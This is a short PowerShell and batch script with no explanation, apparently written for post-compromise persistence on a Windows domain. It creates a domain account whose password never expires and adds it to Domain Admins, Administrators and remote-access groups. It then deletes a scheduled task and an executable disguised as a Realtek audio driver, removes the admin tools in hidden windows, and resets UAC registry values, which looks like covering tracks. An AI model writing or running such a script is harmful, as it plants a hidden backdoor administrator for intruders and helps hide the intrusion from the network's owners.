DISM /Online /Add-Capability /CapabilityName:Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
Start-Sleep -Seconds 5

New-ADUser -Name "user" -SamAccountName user -UserPrincipalName user@xyz.local -AccountPassword (ConvertTo-SecureString "pwdgoeshere" -AsPlainText -Force) -Path "CN=Builtin,DC=xyz,DC=local"-Enabled $true -PasswordNeverExpires $true -Description "if u want add description"

Add-ADGroupMember "Domain Admins" user
Add-ADGroupMember "Administrators" user
Add-ADGroupMember "Utenti desktop remoto" user
Add-ADGroupMember "Utenti gestione remota" user

schtasks /delete /TN "RealtekAudioDriver" /f
Start-Sleep -Seconds 10

Start-Process powershell.exe -ArgumentList "Remove-WindowsCapability -Name 'Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0' -Online" -WindowStyle Hidden
Start-Process cmd.exe -ArgumentList '/c timeout 20 && del /f /q "C:\ProgramData\Realtek\Audio\rtkAudioDRVx64.exe"' -WindowStyle Hidden

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f

